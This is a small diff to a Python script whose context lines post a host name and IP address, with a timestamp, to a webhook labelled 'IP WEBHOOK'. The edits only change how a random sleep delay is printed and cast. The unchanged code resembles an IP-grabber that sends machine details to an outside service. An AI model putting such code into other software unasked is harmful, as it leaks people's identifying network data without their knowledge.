@@ -15,6 +15,6 @@ t = time.strftime("%H:%M:%S", t)
 d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
 d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
 requests.post(u, json=d)
-print(random_time+ " s")
-time.sleep(random_time)
+print(f"{str(random_time)}")
+time.sleep(int(random_time))
 cprint("good", "green")
